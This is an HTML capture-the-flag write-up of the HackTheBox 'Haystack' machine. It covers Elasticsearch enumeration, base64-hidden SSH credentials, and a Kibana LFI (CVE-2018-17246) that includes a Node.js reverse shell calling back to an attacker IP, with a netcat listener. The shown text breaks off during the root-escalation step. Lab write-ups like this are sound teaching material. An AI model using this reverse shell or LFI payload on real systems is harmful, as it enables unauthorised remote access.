@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Haystack</strong></h1>
+        <em>Released: 9th March 2019 / Pwned: July 15th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Haystack, when you're solving it on, feels CTF-like. In hindsight, it does a pretty good job at teaching you about elasticsearch and the ELK stack. The part that sucks is the route to user, which is hidden by the fact that elasticsearch only returns 10 results by default; a key bit of knowledge that you can easily miss from the documentation. Following that, you have to port-forward a locally running service, something I wouldn't rate a machine “easy� for, which exposes an inconsistent and non-obvious CVE that you won't find via <code>searchsploit</code>.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Read a hint from needle.jpg on port 80<br>
+        • Retrieve a username and password from port 9200 using elasticsearch's query language<br>
+        • Port-forward a locally running service out to your attacking machine and use an LFI exploit to gain an elevated shell on the system<br>
+        • Create a file in <code>/opt/kibana</code> with specific syntax and wait for your root shell<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.115</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/haystack#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/haystack#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.115<br>
+                ...<br>
+                Not&nbsp;shown:&nbsp;997&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95&nbsp;(ED25519)<br>
+                80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;nginx&nbsp;1.12.2<br>
+                |_http-server-header:&nbsp;nginx/1.12.2<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html).<br>
+                9200/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;nginx&nbsp;1.12.2<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;DELETE<br>
+                |_http-server-header:&nbsp;nginx/1.12.2<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(application/json;&nbsp;charset=UTF-8).<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        No need for a full port scan as it doesn't reveal anything new.<br>
+        <br>
+        <strong>Ports:</strong><br>
+        • 22/ssh - there's nothing to do here for the time being.<br>
+        • 80/http - there's a website with no title.<br>
+        • 9200/http - another website with no title and on a strange port.<br>
+        <br>
+        Have a look at port 80/http first.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        <code>http://10.10.10.115/</code><br>
+        There's a picture of a needle in a haystack.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Anything contained in the image?<br>
+            <div class="codebox">
+                root@gotham:~/ctf/haystack/80-http#&nbsp;wget&nbsp;http://10.10.10.115/needle.jpg<br>
+                root@gotham:~/ctf/haystack/80-http#&nbsp;strings&nbsp;needle.jpg&nbsp;<br>
+                ...<br>
+                bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==<br>
+                root@gotham:~/ctf/haystack/80-http#&nbsp;echo&nbsp;"bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg=="&nbsp;|&nbsp;base64&nbsp;-d<br>
+                la&nbsp;aguja&nbsp;en&nbsp;el&nbsp;pajar&nbsp;es&nbsp;"clave"
+            </div>
+        </div><br>
+        <br>
+        Yes! A hint.<br>
+        <code>la aguja en el pajar es "clave"</code> translated from Spanish to English is <code>the needle in the haystack is "key"</code>.<br>
+        <br>
+        When we reach the haystack, we're looking for <code>key</code>, or <code>clave</code>.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h2><strong>3) 9200/http</strong></h2><br>
+        <code>http://10.10.10.115:9200/</code><br>
+        This port is an <code>elasticsearch</code> database.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        I learnt how to use elasticsearch from these links:<br>
+        <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.1/_list_all_indices.html">https://www.elastic.co/guide/en/elasticsearch/reference/6.1/_list_all_indices.html</a><br>
+        <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html">https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html</a><br>
+        <br>
+        Indexes contain data.<br>
+        We can list all indexes (indices) in the database using <code>/_cat/indices?v</code><br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        There are 3 indexes<br>
+        • .kiban<br>
+        • quotes<br>
+        • bank<br>
+        <br>
+        We can list all the data in an index using:<br>
+        <code>/index/_search?=pretty</code><br>
+        <br>
+        By default, <code>elasticsearch</code> will only return 10 results. You can get more results using <code>?size</code>:<br>
+        <code>index/_search?size=100</code><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3a) quotes</strong></h3><br>
+        There's nothing interesting in <code>bank</code>.<br>
+        Have a look at the <code>quotes</code> index.<br>
+        <code>http://10.10.10.115:9200/quotes/_search?size=100</code><br>
+        <br>
+        The last result has an interesting message.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        We've found the haystack.<br>
+        <br>
+        You can query/search through indexes using <code>elasticsearch</code>'s query language.<br>
+        <a href="https://www.elastic.co/guide/en/elasticsearch/reference/6.4/getting-started-query-lang.html">https://www.elastic.co/guide/en/elasticsearch/reference/6.4/getting-started-query-lang.html</a><br>
+        <br>
+        Using <em>Burp</em>, search through the <code>quote</code> field in the <code>quotes</code> index for <code>clave</code>, the hint about the “needle� from port 80.<br>
+        <br>
+        <em>Burp</em> query:<br>
+            <div class="codebox">
+                GET&nbsp;/quotes/_search&nbsp;HTTP/1.1<br>
+                Host:&nbsp;10.10.10.115:9200<br>
+                User-Agent:&nbsp;Mozilla/5.0&nbsp;(X11;&nbsp;Linux&nbsp;i686;&nbsp;rv:60.0)&nbsp;Gecko/20100101&nbsp;Firefox/60.0<br>
+                Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>
+                Accept-Language:&nbsp;en-US,en;q=0.5<br>
+                Accept-Encoding:&nbsp;gzip,&nbsp;deflate<br>
+                Connection:&nbsp;close<br>
+                Upgrade-Insecure-Requests:&nbsp;1<br>
+                Content-Length:&nbsp;54<br>
+                Content-Type:&nbsp;application/json<br>
+                <br>
+                {<br>
+                &nbsp;&nbsp;"query":&nbsp;{&nbsp;"match":&nbsp;{&nbsp;"quote":&nbsp;"clave"&nbsp;}&nbsp;}<br>
+                }
+            </div>
+        </div><br>
+        <br>
+        Response:<br>
+            <div class="codebox">
+                HTTP/1.1&nbsp;200&nbsp;OK<br>
+                Server:&nbsp;nginx/1.12.2<br>
+                Date:&nbsp;Sat,&nbsp;13&nbsp;Jul&nbsp;2019&nbsp;00:25:25&nbsp;GMT<br>
+                Content-Type:&nbsp;application/json;&nbsp;charset=UTF-8<br>
+                Content-Length:&nbsp;456<br>
+                Connection:&nbsp;close<br>
+                <br>
+                {"took":7,"timed_out":false,"_shards":{"total":5,"successful":5,"skipped":0,"failed":0},"hits":{"total":2,"max_score":5.9335938,"hits":[{"_index":"quotes","_type":"quote","_id":"45","_score":5.9335938,"_source":{"quote":"Tengo&nbsp;que&nbsp;guardar&nbsp;la&nbsp;clave&nbsp;para&nbsp;la&nbsp;maquina:&nbsp;dXNlcjogc2VjdXJpdHkg&nbsp;"}},{"_index":"quotes","_type":"quote","_id":"111","_score":5.3459888,"_source":{"quote":"Esta&nbsp;clave&nbsp;no&nbsp;se&nbsp;puede&nbsp;perder,&nbsp;la&nbsp;guardo&nbsp;aca:&nbsp;cGFzczogc3BhbmlzaC5pcy5rZXk="}}]}}
+            </div>
+        </div><br>
+        <br>
+        We've found some base64 strings.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        Decode the <code>base64</code> strings.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/haystack/80-http#&nbsp;echo&nbsp;"dXNlcjogc2VjdXJpdHkg"&nbsp;|&nbsp;base64&nbsp;-d<br>
+                user:&nbsp;security<br>
+                root@gotham:~/ctf/haystack/80-http#&nbsp;echo&nbsp;"cGFzczogc3BhbmlzaC5pcy5rZXk="&nbsp;|&nbsp;base64&nbsp;-d<br>
+                pass:&nbsp;spanish.is.key
+            </div>
+        </div><br>
+        <br>
+        Credentials!<br>
+        <code>security / spanish.is.key</code><br>
+        <br>
+        Log in using <code>ssh</code> and retrieve the user flag.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/haystack/80-http#&nbsp;ssh&nbsp;security@10.10.10.115<br>
+                The&nbsp;authenticity&nbsp;of&nbsp;host&nbsp;'10.10.10.115&nbsp;(10.10.10.115)'&nbsp;can't&nbsp;be&nbsp;established.<br>
+                ECDSA&nbsp;key&nbsp;fingerprint&nbsp;is&nbsp;SHA256:ihn2fPA4jrn1hytN0y9Z3vKpIKuL4YYe3yuESD76JeA.<br>
+                Are&nbsp;you&nbsp;sure&nbsp;you&nbsp;want&nbsp;to&nbsp;continue&nbsp;connecting&nbsp;(yes/no)?&nbsp;yes<br>
+                Warning:&nbsp;Permanently&nbsp;added&nbsp;'10.10.10.115'&nbsp;(ECDSA)&nbsp;to&nbsp;the&nbsp;list&nbsp;of&nbsp;known&nbsp;hosts.<br>
+                security@10.10.10.115's&nbsp;password:&nbsp;<br>
+                Last&nbsp;login:&nbsp;Wed&nbsp;Feb&nbsp;&nbsp;6&nbsp;20:53:59&nbsp;2019&nbsp;from&nbsp;192.168.2.154<br>
+                [security@haystack&nbsp;~]$&nbsp;ls<br>
+                user.txt<br>
+                [security@haystack&nbsp;~]$&nbsp;cat&nbsp;user.txt<br>
+                04d18bc...
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h2><strong>4) security -&gt; kibana</strong></h2><br>
+        After enumerating the whole system, you'll realise there aren't any avenues towards priv-esc here.<br>
+        However, whilst reading about/searching through elasticsearch, you should have come across the names of a few other services - <code>kibana</code> and <code>logstash</code>. This is the ELK stack - <a href="https://www.elastic.co/what-is/elk-stack">https://www.elastic.co/what-is/elk-stack</a>.<br>
+        <br>
+        Kibana runs on port 5601 - <a href="https://www.elastic.co/guide/en/kibana/current/settings.html">https://www.elastic.co/guide/en/kibana/current/settings.html</a><br>
+        <br>
+        Check for locally running services on the machine.<br>
+            <div class="codebox">
+                [security@haystack&nbsp;~]$&nbsp;ss&nbsp;-nutlp<br>
+                Netid&nbsp;&nbsp;State&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Recv-Q&nbsp;Send-Q&nbsp;&nbsp;&nbsp;&nbsp;Local&nbsp;Address:Port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Peer&nbsp;Address:Port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                udp&nbsp;&nbsp;&nbsp;&nbsp;UNCONN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;127.0.0.1:323&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                udp&nbsp;&nbsp;&nbsp;&nbsp;UNCONN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::1:323&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:9200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;127.0.0.1:5601&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*:*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;::ffff:127.0.0.1:9000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;::ffff:127.0.0.1:9300&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;::ffff:127.0.0.1:9600&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:::*
+            </div>
+        </div><br>
+        Kibana is running - <code>127.0.0.1:5601</code><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>4a) Port-Forward</strong></h3><br>
+        Port-forward Kibana, port 5601, to our attacking machine so that we can browse to it locally.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/haystack#&nbsp;ssh&nbsp;security@10.10.10.115&nbsp;-L&nbsp;5601:127.0.0.1:5601&nbsp;-nNT<br>
+                security@10.10.10.115's&nbsp;password:&nbsp;spanish.is.key<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <code>ssh</code> should hang.<br>
+        You can now browse to the kibana web app on your attacking machine by visiting <code>http://127.0.0.1:5601</code><br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>4b) Kibana LFI</strong></h3><br>
+        This version of Kibana has an LFI exploit (we know the version of kibana from the elasticsearch output on <code>http://10.10.10.115:9200</code>)<br>
+        <a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a><br>
+        <br>
+        Create a javascript reverse shell on the victim machine and drop it a location that's easy to include, like <code>/tmp</code><br>
+        (make sure to change ip and port to that of your attacking machine)<br>
+            <div class="codebox">
+                [security@haystack&nbsp;~]$&nbsp;vi&nbsp;/tmp/shell.js<br>
+                (function(){<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;net&nbsp;=&nbsp;require("net"),<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cp&nbsp;=&nbsp;require("child_process"),<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh&nbsp;=&nbsp;cp.spawn("/bin/sh",&nbsp;[]);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;client&nbsp;=&nbsp;new&nbsp;net.Socket();<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;client.connect(9001,&nbsp;"10.10.14.13",&nbsp;function(){<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client.pipe(sh.stdin);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stdout.pipe(client);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sh.stderr.pipe(client);<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;});<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;/a/;&nbsp;//&nbsp;Prevents&nbsp;the&nbsp;Node.js&nbsp;application&nbsp;form&nbsp;crashing<br>
+                })();
+            </div>
+        </div><br>
+        <br>
+        Prep a listener on your attacking machine to receive your shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/haystack#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run the LFI and include your shell:<br>
+        <code>/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/shell.js</code><br>
+        <br>
+        <code>http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/shell.js</code><br>
+        <br>
+        You should receive a shell as <code>kibana</code> on your listener!<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.13]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.115]&nbsp;48730<br>
+                id<br>
+                uid=994(kibana)&nbsp;gid=992(kibana)&nbsp;grupos=992(kibana)&nbsp;contexto=system_u:system_r:unconfined_service_t:s0<br>
+                python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                bash-4.2$&nbsp;pwd<br>
+                /
+            </div>
+        </div><br>
+        <br>
+        This exploit can be slightly temperamental.<br>
+        For me, my reverse shells seemed to have a one-time use. If you had gotten a shell already but lost connection, or it simply isn't working, try renaming the <code>shell.js</code> on the victim machine to something new, and include it again. That worked for me.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>5) kibana -&gt; root</strong></h2><br>
+        Now to priv-esc for a second time.<br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>5a) Kibana's files</strong></h3><br>
+        Since we're running as a new user, <code>kibana</code>, check for any new files that we can access by searching for files owned by <code>kibana</code>.<br>
+            <div class="codebox">
+                bash-4.2$&nbsp;find&nbsp;/&nbsp;-user&nbsp;kibana&nbsp;2&gt;/dev/null<br>
+                /dev/pts/1<br>
+                ...<br>
+                /etc/logstash/startup.options<br>
+                /var/lib/kibana<br>
+                /var/lib/kibana/uuid<br>
+                ...<br>
+                /var/log/kibana<br>
+                ...<br>
+                /usr/share/kibana/optimize<br>
+                ...<br>
+                /usr/share/kibana/plugins<br>
+                /opt/kibana
+            </div>
+        </div><br>
+        <br>
+        <code>/etc/logstash</code> looks interesting because it's not a “kibana� file.<br>
+            <div class="codebox">
+                bash-4.2$&nbsp;ls&nbsp;-alh&nbsp;/etc/logstash<br>
+                total&nbsp;52K<br>
+                drwxr-xr-x.&nbsp;&nbsp;3&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;183&nbsp;jun&nbsp;18&nbsp;22:15&nbsp;.<br>
+                drwxr-xr-x.&nbsp;83&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;8,0K&nbsp;jun&nbsp;24&nbsp;05:44&nbsp;..<br>
+                drwxrwxr-x.&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;kibana&nbsp;&nbsp;&nbsp;62&nbsp;jun&nbsp;24&nbsp;08:12&nbsp;conf.d<br>
